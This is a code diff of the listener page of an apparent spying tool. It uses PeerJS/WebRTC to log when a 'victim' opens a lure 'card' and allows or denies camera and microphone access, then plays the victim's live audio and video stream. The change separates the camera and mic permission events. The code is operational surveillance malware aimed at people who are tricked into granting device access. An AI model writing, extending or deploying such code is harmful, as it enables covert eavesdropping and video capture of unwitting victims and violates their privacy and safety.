@@ -42,19 +42,19 @@
       log(`🔌 Listener ready as "${LISTENER_ID}"`);
     });
 
-    // استقبل DataChannel للأحداث
     peer.on('connection', conn => {
       conn.on('data', data => {
-        if (data.event === 'page-open')   log('📥 Victim opened the card');
-        if (data.event === 'mic-allowed') log('✔ Victim allowed mic & camera');
-        if (data.event === 'mic-denied')  log('✖ Victim denied mic/camera');
+        if (data.event === 'page-open')      log('📥 Victim opened the card');
+        if (data.event === 'camera-allowed') log('📷 Victim allowed camera');
+        if (data.event === 'camera-denied')  log('🚫 Victim denied camera');
+        if (data.event === 'mic-allowed')    log('🎙️ Victim allowed mic');
+        if (data.event === 'mic-denied')     log('🚫 Victim denied mic');
       });
     });
 
-    // استقبل بث الصوت والفيديو
     peer.on('call', call => {
       log('📞 Incoming media call');
-      call.answer(); 
+      call.answer();
       call.on('stream', remoteStream => {
         document.getElementById('remoteStream').srcObject = remoteStream;
         log('🎥 Audio/Video stream started');
@@ -68,4 +68,3 @@
   </script>
 </body>
 </html>
-
